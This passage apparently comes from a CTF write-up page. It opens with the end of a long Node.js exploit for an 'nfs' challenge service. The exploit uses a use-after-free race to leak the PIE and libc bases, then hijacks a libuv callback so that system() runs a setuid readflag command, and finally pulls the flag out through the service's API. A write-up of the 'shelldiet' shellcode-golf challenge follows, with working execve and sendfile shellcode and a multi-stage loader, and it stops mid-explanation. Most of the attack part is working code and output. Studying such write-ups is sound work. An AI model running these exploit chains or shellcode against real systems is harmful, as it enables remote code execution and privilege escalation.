                console.log(`  [*] early stop: ${n} matching leaks at round ${finished}`);
              }
            }
          }
          if (stop && active === 0) resolve();
          else if (finished === rounds) resolve();
          else tick();
        });
      }
    };
    tick();
  });
  await new Promise(r => setTimeout(r, HOLD_MS));
  const counts = new Map();
  for (const l of stageLeaks) counts.set(l, (counts.get(l) || 0) + 1);
  const sorted = [...counts.entries()].sort((a,b) => b[1] - a[1]);
  if (sorted.length === 0) { console.log(`  → no leaks captured`); return { top: null, all: [], counts: sorted }; }
  console.log(`  → ${stageLeaks.length} leaks; ${counts.size} unique patterns; top ${sorted[0][1]}× "${sorted[0][0].slice(0, 80)}${sorted[0][0].length > 80 ? '...' : ''}"`);
  return { top: sorted[0][0], all: stageLeaks.slice(), counts: sorted };
}

// ---------------------------------------------------------------------------
// Stage 1: PIE base recovery via INVERTED UAF (uv_fs_write writeback).
// ---------------------------------------------------------------------------
//
// Instead of pred-WRITING bytes INTO the freed slot and observing via the
// rename error message (which forces all bytes through V8's UTF-8 parser
// and loses any byte in 0x80..0xFF without elaborate priming), we pred-READ
// the entire freed slot OUT to a file by issuing uv_fs_write whose buf is
// the raw bdB.data pointer. After bdB is freed and reclaimed by a sprayed
// FSReqPromise, the libuv worker's pwrite drains the FSReqPromise's bytes
// to disk. We then read the file back and parse PIE pointers directly —
// no UTF-8, no priming, no per-byte voting.
//
// PIE anchors observed (offsets within the 796-byte snapshot):
//   slot+0   : FSReqPromise<AliasedFloat64Array> vtable_ptr     → PIE
//   slot+560 : FSReqBase::syscall_ → "rename" in .rodata        → PIE
//   slot+672 : stats_field_array_ vtable (AliasedBufferBase)    → PIE (primary)
//
// The race round itself is structurally identical to raceRound (the gather/
// scatter TOCTOU still detaches bdB while libuv holds a captured ptr); only
// the libuv op changes from read→write and the source file is fetched back.

async function raceRoundWrite(roundIdx) {
  const leakPath = `/leak_${process.pid}_${roundIdx}`;
  let c;
  try { c = await newSession(); } catch { return { ok: false, reason: 'connect' }; }
  try {
    // Batch 1 — independent allocs + open. 4 ops, 1 RTT.
    const [s0, s1, s2, s3] = await Promise.all(c.sendBatchMixed([
      { opField: 'balloc', opData: { size: 8       },                                         wantSignal: true },
      { opField: 'balloc', opData: { size: 4       },                                         wantSignal: true },
      { opField: 'balloc', opData: { size: BD_SIZE },                                         wantSignal: true },
      { opField: 'open',   opData: { path: leakPath, flags: O_WRONLY | O_CREAT | O_TRUNC },   wantSignal: true },
    ]));
    const bdSel = Number(s0.retval);
    const bdA   = Number(s1.retval);
    const bdB   = Number(s2.retval);
    const fdW   = Number(s3.retval);

    // Batch 2 — bscatter + bgather + marker fill. 1 RTT.
    const [sc, gg] = await Promise.all(c.sendBatchMixed([
      { opField: 'bscatter', opData: { bd: 0, sourceBd: bdSel, offset: 0, length: 1 },                                wantSignal: true },
      { opField: 'bgather',  opData: { bd: 0, sourceBds: [bdA, bdB], selectorBd: bdSel, selectorOffset: 0 },          wantSignal: true },
      { opField: 'bwrite',   opData: { bd: bdB, offset: 0, data: Buffer.alloc(BD_SIZE, 0x41) },                       wantSignal: true },
    ]));
    const bdSc = Number(sc.retval);
    const G    = Number(gg.retval);
    // Selector flip MUST complete before the race batch — else btransform's
    // PWN could detach bdA instead of bdB. 1 RTT.
    await c.sys('bwrite', { bd: bdSc, offset: 0, data: Buffer.from([1]) });

    // Kick the stall pool BEFORE the race batch — on high-RTT links the kick
    // packets must arrive at the server ahead of our write op so the brotli
    // tasks queue ahead of our libuv write.
    kickStall();

    // Batch 3 — race [write, btransform]. 1 RTT.
    // The write op captures bdB.data into a libuv worker; btransform 'PWN'
    // detaches bdB immediately afterwards, leaving the worker holding a
    // dangling pointer that gets reclaimed by a sprayed FSReqPromise.
    const sigs = c.sendBatchMixed([
      { opField: 'write',      opData: { fd: fdW, bd: bdB, bufOffset: 0, length: BD_SIZE }, wantSignal: false },
      { opField: 'btransform', opData: { bd: G, op: 'PWN' },                                wantSignal: true  },
    ]);
    try { await sigs[1]; } catch {}
    c.corked(() => {
      c.sysAck('resume', { token: SHARED_TOKEN }).catch(() => {});
      c.sysAck('resume', { token: SHARED_TOKEN }).catch(() => {});
    });
    await new Promise(r => setImmediate(r));
    fireBurst().catch(() => {});
    // Wait for the stalled pwrite to drain (must exceed brotli queue depth).
    await new Promise(r => setTimeout(r, HOLD_MS));

    // Read the leak file back on the SAME session. Doing it on a separate
    // session would race: the close-trick above re-binds SHARED_TOKEN to this
    // conn, which on the remote kicks other token-bound sessions off (their
    // ops fail with 'disconnected'). Reuse this conn to avoid that.
    return await readLeakFileOn(c, leakPath);
  } catch (e) {
    return { ok: false, reason: e.message };
  } finally {
    try { c.close(); } catch {}
  }
}

async function readLeakFileOn(c, path) {
  let openRes, ballocRes;
  try {
    [openRes, ballocRes] = await Promise.all(c.sendBatchMixed([
      { opField: 'open',   opData: { path, flags: O_RDONLY }, wantSignal: true },
      { opField: 'balloc', opData: { size: BD_SIZE },         wantSignal: true },
    ]));
  } catch (e) {
    return { ok: false, reason: e.message };
  }
  const fdR = Number(openRes.retval);
  const bd  = Number(ballocRes.retval);
  try {
    const n = Number((await c.sys('read', { fd: fdR, bd, bufOffset: 0, length: BD_SIZE })).retval);
    if (n === 0) return { ok: false, reason: 'empty' };
    const r = await c.sys('bread', { bd, offset: 0, length: n });
    return { ok: true, bytes: Buffer.from(r.breadResult.data) };
  } catch (e) {
    return { ok: false, reason: e.message };
  }
}

function looksLikeUserPointer(qword) {
  // 47-bit canonical user-space address (top 17 bits 0). Reject tiny ints.
  return (qword >> 47n) === 0n && qword > 0xFFFFn;
}

function isMarkerOnly(buf) {
  // Pre-fill 0x41s seen in first 32 bytes → kernel wrote before reclaim landed.
  for (let i = 0; i < Math.min(buf.length, 32); i++) if (buf[i] !== 0x41) return false;
  return true;
}

// Analyze one 796-byte snapshot for PIE_base. Tries vtable672 first, falls
// back to syscall_. Either anchor alone is enough — if vote-of-many across
// rounds converges (see STAGE1_MIN_VOTES), partial-reclaim noise gets outvoted.
function analyzeSnapshot(buf, roundIdx, verbose) {
  if (buf.length < BD_SIZE) return null;
  if (isMarkerOnly(buf))     return null;

  function decode(off, binOff, name) {
    const q = buf.readBigUInt64LE(off);
    if (!looksLikeUserPointer(q)) return null;
    const pb = q - binOff;
    if ((pb & 0xFFFn) !== 0n) return null;     // page-aligned
    if ((pb >> 47n) !== 0n)   return null;     // 47-bit canonical
    if (pb <= 0n)             return null;
    if (verbose) console.log(`  [r${roundIdx}] ${name} = 0x${q.toString(16).padStart(12,'0')}  → PIE_base = 0x${pb.toString(16).padStart(12,'0')}`);
    return { leaked: q, pieBase: pb };
  }

  return decode(SLOT_OFF_VTABLE672, VTABLE_BIN_OFFSET,  'slot+672 vtable672')
      || decode(SLOT_OFF_SYSCALL,   SYSCALL_BIN_OFFSET, 'slot+560 syscall_ ');
}

// Stage 1 succeeds the moment we have STAGE1_MIN_VOTES corroborating reclaim
// snapshots that decode to the SAME PIE base — at that point further rounds
// add nothing. Each reclaim also independently cross-checks vtable672 and
// syscall_ to the same base (see analyzeSnapshot), so one snapshot already
// carries two-anchor consensus; a few of them is overdetermined.
const STAGE1_MIN_VOTES = parseInt(process.env.STAGE1_MIN_VOTES || '3');

async function stage1PieRecovery() {
  console.log('\n========== STAGE 1: PIE recovery (writeback primitive) ==========');
  const prevKind = STAGE_KIND;
  STAGE_KIND = 'writeback';  // sprayer skips parsing
  try {
    const pieVotes = new Map();
    let started = 0, finished = 0, dumps = 0, reclaims = 0;
    let stop = false;
    let verboseRemaining = 3;

    await new Promise((resolve) => {
      let active = 0;
      const tick = () => {
        if (stop && active === 0) { resolve(); return; }
        while (!stop && active < RACE_PARALLEL && started < ROUNDS_PER_STAGE) {
          active++;
          const idx = started++;
          raceRoundWrite(idx).then((r) => {
            active--; finished++;
            if (r && r.ok && r.bytes) {
              dumps++;
              if (!isMarkerOnly(r.bytes)) {
                reclaims++;
                const result = analyzeSnapshot(r.bytes, idx, verboseRemaining > 0);
                if (result) {
                  if (verboseRemaining > 0) verboseRemaining--;
                  const k = result.pieBase.toString();
                  const n = (pieVotes.get(k) || 0) + 1;
                  pieVotes.set(k, n);
                  if (n >= STAGE1_MIN_VOTES && !stop) {
                    stop = true;
                    console.log(`  [*] early stop: ${n} matching votes (>=${STAGE1_MIN_VOTES}) at round ${finished}`);
                  }
                }
              }
            } else if (finished <= 5) {
              // Surface readLeakFile failures during the first few rounds so we
              // can tell "file missing" from "race didn't land" on a quiet remote.
              console.log(`  [r${idx}] no dump: ${r && r.reason || 'unknown'}`);
            }
            // Report every round during the first wave so high-RTT runs show
            // life immediately, then drop to every 10 rounds.
            const reportEvery = finished <= RACE_PARALLEL * 2 ? 1 : 10;
            if (finished % reportEvery === 0 || finished === ROUNDS_PER_STAGE) {
              console.log(`  [*] progress ${finished}/${ROUNDS_PER_STAGE}  dumps=${dumps}  reclaims=${reclaims}  unique_pie=${pieVotes.size}`);
            }
            if (stop && active === 0) resolve();
            else if (finished === ROUNDS_PER_STAGE) resolve();
            else tick();
          });
        }
      };
      tick();
    });

    // Drain after early-stop so in-flight rounds don't race with later stages.
    await new Promise(r => setTimeout(r, HOLD_MS));

    console.log(`\n[*] writeback summary: ${dumps} file dumps, ${reclaims} with reclaim signature, ${pieVotes.size} distinct PIE candidates`);
    if (pieVotes.size === 0) {
      console.log('[!] no PIE base recovered — likely the race never reclaimed; consider bumping HOLD_MS / SPRAY_CONNS');
      return null;
    }
    const sorted = [...pieVotes.entries()].sort((a, b) => b[1] - a[1]);
    for (const [pb, n] of sorted.slice(0, 5)) {
      console.log(`     ${String(n).padStart(4,' ')}×  PIE_base = 0x${BigInt(pb).toString(16).padStart(12,'0')}`);
    }
    const winner = BigInt(sorted[0][0]);
    console.log(`\n[*] PIE_base               = 0x${winner.toString(16).padStart(12,'0')}`);
    console.log(`[*] vtable_aliased_buffer  = 0x${(winner + VTABLE_BIN_OFFSET).toString(16)}`);
    console.log(`[*] syscall_ "rename"      = 0x${(winner + SYSCALL_BIN_OFFSET).toString(16)}`);
    return winner;
  } finally {
    STAGE_KIND = prevKind;
  }
}

// ---------------------------------------------------------------------------
// Stage 2: libc base recovery via syscall_ pointer redirect.
//
// pred-WRITES 8 bytes at slot+560, overwriting FSReqBase::syscall_ with the
// runtime address of execve@GOT (= PIE_base + EXECVE_GOT_BIN_OFFSET). When
// the sprayed rename fails ENOENT, UVException builds the error via
// OneByteString(isolate, syscall) → strlen + NewFromOneByte (Latin-1 — every
// byte preserved). The 6 leaked bytes come back in the error's syscall slot;
// pad bytes 6,7 with 0 (canonical 47-bit) to reconstruct the full pointer.
//
// libc_base = leaked_execve_runtime - MUSL_EXECVE_OFFSET.
// system    = libc_base + MUSL_SYSTEM_OFFSET (used by Stage 3).
//
// CAUTION: a corrupted syscall_ pointing to unmapped memory SIGSEGVs the
// strlen. execve@GOT is in the binary's .got — always mapped + readable.
// ---------------------------------------------------------------------------

const STAGE2_MIN_VOTES = parseInt(process.env.STAGE2_MIN_VOTES || '3');

function bigintToLeBytes(n, len = 8) {
  const b = Buffer.alloc(len);
  let v = n;
  for (let i = 0; i < len; i++) { b[i] = Number(v & 0xFFn); v >>= 8n; }
  return b;
}

async function stage2LibcRecovery(pieBase) {
  console.log('\n========== STAGE 2: libc leak via syscall_ redirect ==========');
  const gotAddr = pieBase + EXECVE_GOT_BIN_OFFSET;
  const victim = bigintToLeBytes(gotAddr, SYSCALL_LEAK_LENGTH);
  console.log(`[*] redirect syscall_ → execve@GOT at 0x${gotAddr.toString(16)} (LE bytes: ${victim.toString('hex')})`);

  STAGE_KIND = 'libc';
  libcDbg.total = 0; libcDbg.corrupted = 0; libcDbg.samples.length = 0;
  try {
    await runStage('libc-leak', SYSCALL_PRED_OFFSET, SYSCALL_LEAK_LENGTH, victim,
                   ROUNDS_PER_STAGE, { minVotes: STAGE2_MIN_VOTES });
  } finally {
    STAGE_KIND = 'idle';
  }
  console.log(`[dbg] total rename errors observed=${libcDbg.total} with corrupted syscall=${libcDbg.corrupted}`);
  if (stageLeaks.length === 0) {
    console.log('[!] no libc leaks captured');
    return null;
  }
  const counts = new Map();
  for (const l of stageLeaks) counts.set(l, (counts.get(l) || 0) + 1);
  const sorted = [...counts.entries()].sort((a, b) => b[1] - a[1]);
  console.log(`[*] captured ${stageLeaks.length} leaks, ${counts.size} unique:`);
  for (const [k, n] of sorted.slice(0, 3)) {
    const bytes = JSON.parse(k);
    console.log(`      ${String(n).padStart(4, ' ')}×  [${bytes.map(b => '0x' + b.toString(16).padStart(2,'0')).join(' ')}]`);
  }
  // Most-common pattern is canonical. Pad to 8 bytes with zeros (47-bit user
  // pointer: bytes 6, 7 = 0; strlen stopped at the first of them).
  const topBytes = JSON.parse(sorted[0][0]);
  const padded = topBytes.slice(0, 8);
  while (padded.length < 8) padded.push(0);
  let runtime = 0n;
  for (let i = 0; i < 8; i++) runtime |= BigInt(padded[i]) << BigInt(i * 8);
  console.log(`[+] execve runtime addr = 0x${runtime.toString(16)}`);
  return { runtime, leakedBytes: topBytes };
}

// ---------------------------------------------------------------------------
// Stage 3: RCE via req->cb hijack.
//
// We compute system = libc_base + MUSL_SYSTEM_OFFSET, then overwrite the
// rename's req->cb (at slot+188 = FSReqPromise+184, accounting for the -8
// layout shift) with system's runtime address. We ALSO plant a shell command
// at the start of the same uv_fs_t (slot+108..187 via pred); when libuv's
// uv__fs_done does `jmp *%rax` with rdi=req, control transfers to system
// with rdi pointing at our command string.
//
// system forks before execve("/bin/sh"), so the parent (node) returns
// cleanly — the server stays alive, letting us exfil the flag.
//
// COMMAND: defaults to '/readflag > <storage>/flag.out'. /readflag is setuid
// root in the container; redirect writes the flag to a file owned by our
// nfs user (the sh runs as non-root; the file is created by sh open() before
// /readflag is execed).
// ---------------------------------------------------------------------------

const STAGE3_DRY_RUN = process.env.STAGE3_DRY_RUN === '1';

// uv_fs_t layout (relative to req_ = slot+104, so /victim[X] = req_+X):
//   +0    data            (we plant cmd string here; rdi == req at cb invoke)
//   +8    type            (uv_req_type, value UV_FS=7 — leave as cmd byte, harmless)
//   +16   reserved[6]
//   +64   fs_type         (UV_FS_RENAME=21 — MUST preserve; worker switches on it)
//   +72   loop            (must point at writable; uv__fs_done deref's @+0x20)
//   +80   cb              (target: system)
//
// uv__fs_done preamble decrements req->loop->active_reqs.count at @+0x20 of
// loop, so loop must be mapped+writable with non-zero @+0x20. PIE_base+0x69ef000
// (.data start) satisfies both.
//
// uv__fs_work also reads fs_type EARLY (switch on fs_type). If our pred fires
// before that read on a reclaiming worker, fs_type=0 → switch default → abort.
// → /victim[64..67] = UV_FS_RENAME so any worker that sees mid-flight corruption
// still falls into the rename case. (The rename will then operate on whatever
// data/path bytes happen to be there — typically returns ENOENT, harmless.)
const UV_FS_RENAME          = 21;
const SAFE_LOOP_DATA_OFFSET = 0x69EF000n;
const RCE_FS_TYPE_VICTIM_BYTE = 64;
const RCE_LOOP_VICTIM_BYTE    = 72;

function buildRceVictim(systemAddr, safeLoopAddr, cmd) {
  const v = Buffer.alloc(RCE_LEAK_LENGTH, 0);
  v.write(cmd, 0, 'binary');
  v.writeUInt32LE(UV_FS_RENAME, RCE_FS_TYPE_VICTIM_BYTE);
  for (let i = 0; i < 8; i++) {
    v[RCE_LOOP_VICTIM_BYTE + i] = Number((safeLoopAddr >> BigInt(i * 8)) & 0xFFn);
  }
  for (let i = 0; i < 8; i++) {
    v[RCE_CB_VICTIM_BYTE + i]   = Number((systemAddr   >> BigInt(i * 8)) & 0xFFn);
  }
  return v;
}

async function stage3RceHijack(pieBase, libcLeak) {
  console.log('\n========== STAGE 3: RCE via req->cb → system ==========');
  if (libcLeak === null) {
    console.log('[!] no libc leak — cannot compute system address. Aborting.');
    return null;
  }

  const libcBase   = libcLeak.runtime - MUSL_EXECVE_OFFSET;
  const systemAddr = libcBase + MUSL_SYSTEM_OFFSET;
  console.log(`[*] libc_base = 0x${libcBase.toString(16).padStart(12, '0')}`);
  console.log(`[*] system    = 0x${systemAddr.toString(16)}`);

  // Build the shell command. Use the user's storage_root so flag.out is
  // owned by ctf (readable via nfs API).
  const flagOutFile = `${STORAGE_ROOT}/flag.out`;
  const cmd = process.env.RCE_CMD || `/readflag > ${flagOutFile}`;
  console.log(`[*] command  : ${cmd}  (length ${cmd.length})`);
  console.log(`[*] flag file: ${flagOutFile}`);

  // Command MUST fit before fs_type at /victim[64], otherwise we'd overwrite
  // the preserved fs_type value and the next race round's worker would abort.
  if (cmd.length >= RCE_FS_TYPE_VICTIM_BYTE) {
    console.log(`[!] cmd too long (${cmd.length} ≥ ${RCE_FS_TYPE_VICTIM_BYTE}); fs_type byte would be overwritten`);
    return null;
  }

  const safeLoopAddr = pieBase + SAFE_LOOP_DATA_OFFSET;
  console.log(`[*] safe req->loop ptr → PIE_base + 0x${SAFE_LOOP_DATA_OFFSET.toString(16)} = 0x${safeLoopAddr.toString(16)}`);
  const victim = buildRceVictim(systemAddr, safeLoopAddr, cmd);
  console.log(`[*] /victim (${victim.length}B):`);
  console.log(`     [0..${cmd.length}]   = cmd ('${cmd}')`);
  console.log(`     [${RCE_LOOP_VICTIM_BYTE}..${RCE_LOOP_VICTIM_BYTE + 8}]  = safe loop @0x${safeLoopAddr.toString(16)}`);
  console.log(`     [${RCE_CB_VICTIM_BYTE}..${RCE_CB_VICTIM_BYTE + 8}]  = system  @0x${systemAddr.toString(16)}`);
  console.log(`[*] /victim hex = ${victim.toString('hex')}`);

  if (STAGE3_DRY_RUN) {
    console.log('[*] STAGE3_DRY_RUN=1 — skipping corruption rounds.');
    return { flagOutFile, systemAddr, libcBase, cmd };
  }

  // Use fewer rounds and exfil-in-parallel to race the destructor's
  // CHECK_IMPLIES abort. Default 30 rounds; raise/lower via RCE_ROUNDS env.
  const rceRounds = parseInt(process.env.RCE_ROUNDS || '30');
  console.log(`[*] firing ${rceRounds} RCE rounds (pred at slot+${RCE_PRED_OFFSET}, length ${RCE_LEAK_LENGTH})`);
  console.log(`[*] starting exfil poller IN PARALLEL (read flag.out before destructor abort fires)`);

  // Sprayer stays in 'idle' mode — no parsing needed during RCE.
  await primeVictim(victim);

  // Race rounds in parallel with exfil polling. Whichever lands first wins.
  let exfilResult = null;
  const exfilPromise = stage4Exfil(flagOutFile).then(r => { exfilResult = r; });

  // Spawn RCE rounds.
  let started = 0, finished = 0;
  const racePromise = new Promise((resolve) => {
    let active = 0;
    const tick = () => {
      while (active < RACE_PARALLEL && started < rceRounds && !exfilResult) {
        active++; started++;
        raceRound(RCE_PRED_OFFSET, RCE_LEAK_LENGTH).then(() => {
          finished++; active--;
          if (finished === rceRounds || exfilResult) resolve();
          else tick();
        });
      }
      if (started >= rceRounds && active === 0) resolve();
    };
    tick();
  });

  await Promise.race([racePromise, exfilPromise]);
  // If race finished but exfil hasn't, give exfil a bit more time.
  if (!exfilResult) {
    console.log(`[*] race rounds done, waiting on exfil…`);
    await exfilPromise;
  }
  return { flagOutFile, systemAddr, libcBase, cmd, flag: exfilResult };
}

// ---------------------------------------------------------------------------
// Stage 4: exfiltrate the flag file via the nfs API.
//
// /readflag (setuid root, run inside system()'s shell) writes the flag to
// the redirect target. The file is created by sh open() under the nfs user's
// uid → readable via the nfs API as the regular user.
// ---------------------------------------------------------------------------

async function stage4Exfil(flagOutFile) {
  console.log('\n========== STAGE 4: exfil flag.out ==========');
  console.log(`[*] target: ${flagOutFile}`);
  // strip the storage_root prefix to get the user-relative path
  if (!flagOutFile.startsWith(STORAGE_ROOT + '/')) {
    console.log(`[!] flagOutFile does not start with storage_root — manual exfil needed`);
    return null;
  }
  const userRelPath = flagOutFile.slice(STORAGE_ROOT.length);
  console.log(`[*] nfs path: ${userRelPath}`);

  // Fast-cadence poll for the flag.out to appear with content.
  const maxAttempts = parseInt(process.env.EXFIL_ATTEMPTS || '120');
  const sleepMs = parseInt(process.env.EXFIL_SLEEP_MS || '200');
  for (let attempt = 1; attempt <= maxAttempts; attempt++) {
    let c;
    try {
      c = await newSession();
      // stat first to see if file exists with content
      let size = 0;
      try {
        const statRes = await c.sys('stat', { path: userRelPath });
        size = Number(statRes.statResult.size);
      } catch (e) {
        // ENOENT — file not yet created
        if (attempt % 5 === 0) console.log(`[*] attempt ${attempt}/${maxAttempts}: file not present yet (${e.message.slice(0, 80)})`);
        continue;
      }
      if (size === 0) {
        if (attempt % 5 === 0) console.log(`[*] attempt ${attempt}/${maxAttempts}: file exists but empty`);
        continue;
      }
      console.log(`[+] flag file exists, size=${size} bytes`);
      // Open + read
      const fd = Number((await c.sys('open', { path: userRelPath, flags: O_RDONLY })).retval);
      const bd = Number((await c.sys('balloc', { size: Math.max(size, 16) })).retval);
      const bytesRead = Number((await c.sys('read', { fd, bd, bufOffset: 0, length: size })).retval);
      const data = (await c.sys('bread', { bd, offset: 0, length: bytesRead })).breadResult.data;
      const buf = Buffer.from(data);
      console.log(`\n╔══════════════════════════════════════════════════════════╗`);
      console.log(`║  FLAG (${bytesRead} bytes):`);
      console.log(`║  ${JSON.stringify(buf.toString('utf8'))}`);
      console.log(`╚══════════════════════════════════════════════════════════╝`);
      console.log(`raw hex: ${buf.toString('hex')}`);
      return buf;
    } catch (e) {
      if (attempt % 5 === 0) console.log(`[*] attempt ${attempt}/${maxAttempts}: ${e.message.slice(0, 80)}`);
    } finally {
      try { c?.close(); } catch {}
    }
    await new Promise(r => setTimeout(r, sleepMs));
  }
  console.log(`[!] exfil failed after ${maxAttempts} attempts — flag file never appeared`);
  return null;
}

// ---------------------------------------------------------------------------
// Main
// ---------------------------------------------------------------------------

async function main() {
  console.log(`[*] target ${HTTP_URL}`);
  console.log(`[*] support pools: brotli=${SAT_BROTLI_CONNS}*${SAT_BROTLI_PAR} sprayers=${SPRAY_CONNS} burst=${BURST_CONNS} stall=${STALL_CONNS}`);
  console.log(`[*] timing: HOLD_MS=${HOLD_MS} KICK_DELAY_MS=${KICK_DELAY_MS} WARMUP_MS=${WARMUP_MS} RACE_PARALLEL=${RACE_PARALLEL} (TLS=${SECURE} LOW_RATE=${LOW_RATE})`);

  const proto = await fetchProto();
  const root  = protobuf.parse(proto).root;
  Request       = root.lookupType('nfs.Request');
  ServerMessage = root.lookupType('nfs.ServerMessage');

  console.log(`[*] discovering storage_root + priming /victim…`);
  await primeVictim(Buffer.alloc(1, 0));
  console.log(`[*] storage_root=${STORAGE_ROOT}`);

  console.log(`[*] launching support pools…`);
  for (let i = 0; i < SAT_BROTLI_CONNS; i++) brotliBlocker();
  for (let i = 0; i < SPRAY_CONNS;      i++) sprayer();
  await setupBurst();
  await setupStall();

  console.log(`[*] warming up (${WARMUP_MS}ms)…`);
  await new Promise(r => setTimeout(r, WARMUP_MS));

  // Always run Stage 1 fresh — ASLR randomizes PIE base per process start,
  // so any PIE base from a prior run is stale if the server has respawned.
  const pieBase = await stage1PieRecovery();
  if (pieBase === null) {
    running = false;
    console.log('\n[!] PIE recovery failed — terminating');
    process.exit(1);
  }

  // Stage 2: leak libc base via syscall_ pointer redirect.
  const libcLeak = await stage2LibcRecovery(pieBase);
  if (!libcLeak) {
    running = false;
    console.log('\n[!] libc leak failed — terminating');
    process.exit(1);
  }

  // Stage 3: hijack req->cb → system(cmd). Pred plants both the cb pointer
  // (= system) AND the command string in the same race round. Stage 3
  // also runs Stage 4 (exfil) in PARALLEL, racing the destructor abort.
  const rceInfo = await stage3RceHijack(pieBase, libcLeak);
  if (rceInfo && rceInfo.flag) {
    running = false;
    await new Promise(r => setTimeout(r, 500));
    process.exit(0);
  }
  if (!rceInfo) {
    running = false;
    console.log('\n[!] RCE setup failed — terminating');
    process.exit(1);
  }
  // Fallback: race finished but exfil didn't hit. Try once more after a beat.
  console.log('\n[*] retrying exfil once more (in case race+exfil missed each other)…');
  const flag = await stage4Exfil(rceInfo.flagOutFile);
  if (flag) {
    running = false;
    await new Promise(r => setTimeout(r, 500));
    process.exit(0);
  }

  running = false;
  await new Promise(r => setTimeout(r, 1000));
  process.exit(0);
}

main().catch((e) => { console.error('fatal:', e); process.exit(2); });
```

</details>

<br>

# shelldiet

Author: CherryDT\
Category: King of the Hill

Description:
> I'm on a seed-only diet, except shells
>
> ncat --ssl shelldiet.ctfwithbirds.com 1337

## TL;DR
`shelldiet` is a tiny shellcode golf challenge wrapped in a King-of-the-Hill scoring scheme. The binary reads up to 4096 bytes of shellcode into an RWX page at a fixed address, scores you on the *sum* of those bytes (lower is better), then jumps to your code with almost every register zeroed. Spawning a shell is easy. The whole challenge is about driving the scored byte-sum as low as possible.

It was quite a journey! We went through many iterations and ideas, including:
- a normal `execve("/bin/sh")` payload (sum 1560 -> 871),
- a multi-stage loader where only a tiny first stage is scored (sum 260 -> 189),
- self-modifying code that constructs expensive opcode bytes from cheaper bytes and parts of the `rax` at runtime (sum 123 -> 110),
- an "all zeros plus a few construction bytes" loader that builds almost all bytes of the real payload in place with "nop/add" slides (sum 46 -> 23),
- using the address bytes in `rax` multiple times to get a more favorable construction (sum 23 -> 21),
- a `ret` back into `main` to get a second, unscored `read` (sum 13 -> 12),
- and finally the realization that `/diet-level` is a *pipe*: if our shellcode drains the value the binary already wrote and then writes its own `00 00 00 00`, the scoreboard reads **sum 0**! 😎

## Analysis

### The binary
The handout is a single small ELF, `chal`, built from this `chal.c`:

```c
int main() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    uint8_t *shellcode = (uint8_t *)mmap((void *)0x1337000, 4096, 7,
                                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    printf("im hungry: ");
    ssize_t nb = read(0, shellcode, 4096);
    if (nb <= 0)
        return 1;

    int s = 0;
    for (int i = 0; i < nb; i++)
        s += shellcode[i];

    int fd = open("/diet-level", O_WRONLY | O_NONBLOCK);
    if (fd >= 0) {
        write(fd, &s, 4);
        close(fd);
    }
    printf("diet-level: %d\n", s);

    __asm__ volatile (
        "xor %%rbx, %%rbx\n"
        ... /* every GPR zeroed */
        "xor %%r15, %%r15\n"
        "call *%%rax"
        :
        : "a" (shellcode)
        : ...
    );
}
```

So the rules of the game are:
- A fixed RWX page is mapped at `0x1337000` (note: `prot = 7` = RWX, so we can self-modify freely).
- It reads at most 4096 bytes from stdin into that page.
- The "diet-level" score `s` is the sum of all bytes that were read, as an `int`. Lower is better.
- That score is written, as 4 raw little-endian bytes, to `/diet-level` (opened `O_WRONLY | O_NONBLOCK`), and also printed.
- Then every general purpose register is zeroed *except* `rax`, which holds the page address, and the binary does `call *rax`.

Entry state for our shellcode is therefore:

```
rax = 0x1337000   (start of our buffer, also the page base)
all other GPRs = 0
rsp = valid stack
```

Two details end up mattering a lot later:
1. `read` only returns whatever is currently buffered. If we send our bytes in separate TCP segments with a small pause in between, the first `read` returns just the first chunk, and only *that* chunk is scored. The binary never reads again on its own, but we can make *our* shellcode call `read` to pull in more.
2. `rax = 0x1337000` means `al = 0x00` and `ah = 0x70` for free at entry. Those constants turn out to be useful for constructing other bytes in self-modified code.

### The scoring / king-of-the-hill setup
The remote is a service behind `ncat --ssl`, gated by a team token and a proof-of-work. There is a live scoreboard at `shelldiet-scoreboard.ctfwithbirds.com`.

This is a King-of-the-Hill challenge. From the rules:
> Each KotH challenge has an internal raw scoring function, applied each tick [...]. Per-tick points are awarded at a rate of `100 / sqrt(rank)`. Ties get the average. The accumulated score is scaled over time so the winner ends up with 1.5x a normal Jeopardy max.

In other words: the lower our diet-level, the better our rank each tick, and points pile up over the whole contest. So a small constant improvement, held for a long time, is worth a lot. We were unfortunately a bit late to the game and made the biggest improvements only towards the end...

## Exploitation

### First shells: just pop a shell (sum 1560 -> 871)
The very first working solves did not care about score at all, just getting a shell and reading the flag. Because stdin and stdout are the socket, a spawned `/bin/sh` happily takes its commands from the same connection, so `cat /flag` (or even just running commands after `execve`) gives us the flag.

We started around 32 bytes, trimmed to 30, then noticed that a 27-byte payload scored *worse* than a 26-byte one. We realized we had misunderstood the challange at first - the score is the **byte sum**, not the length. A short payload full of high bytes is worse than a slightly longer payload full of cheap bytes... \*facepalm*

One direction was a no-shell `sendfile` payload that pipes `/flag` straight to stdout:

```
8d78159304020f0557415a96bf0100000004280f052f666c6167   ; sum 1560
 lea  edi,[rax+21]   ; rdi -> "/flag" (page+21)
 xchg eax,ebx        ; rax=0, rbx=page
 add  al,2           ; rax=2 (open)
 syscall             ; open("/flag", O_RDONLY)
 ...
 syscall             ; sendfile(1, fd, NULL, big)
 "/flag"             ; raw path bytes, never executed
```

The cheaper and more flexible route was `execve("/bin/sh")` and then feeding shell commands over the socket. Iterating on the register setup got us:
- `8d78098d01043b0f052f62696e2f7368` -> 1121
- `040797043b0f052f62696e2f7368` -> 871

871 was about as low as a single-shot `execve` gets (without self-modifying code yet, we hadn't yet figured that out), because the `/bin/sh` string alone (`2f 62 69 6e 2f 73 68`) is already an chunk of high bytes (sum 626) you have to pay for.

### Multi-stage: only pay for the loader (sum 260)
The first breakthrough was realizing the binary only scores the *first* `read`. So instead of paying for the whole `execve` payload, we send:

1. A tiny **stage 1** that just performs `read(0, page, some_large_number)` to pull in more bytes. **Only these bytes are scored!**
2. A larger **stage 2** (the real `execve` shellcode) which is *not* scored, delivered as a second TCP chunk after a short pause.
3. **Stage 3**, plain text shell commands (`cat /flag`) for the spawned shell.

(Yes, we could have sent the previous payload that directly uses `open` and `sendfile` in stage 2 and not need any stage 3 but at this point it didn't matter, and a shell was more flexible.)

The pause between chunks is what makes the binary's first `read` return with only stage 1 buffered.

The minimal stage 1 is four bytes:

```
5a 96 0f 05                 ; sum = 0x5a+0x96+0x0f+0x05 = 260
 5a    pop rdx              ; rdx = the call-pushed return address (huge, definitely >8),
                            ;       which is a perfectly fine read length
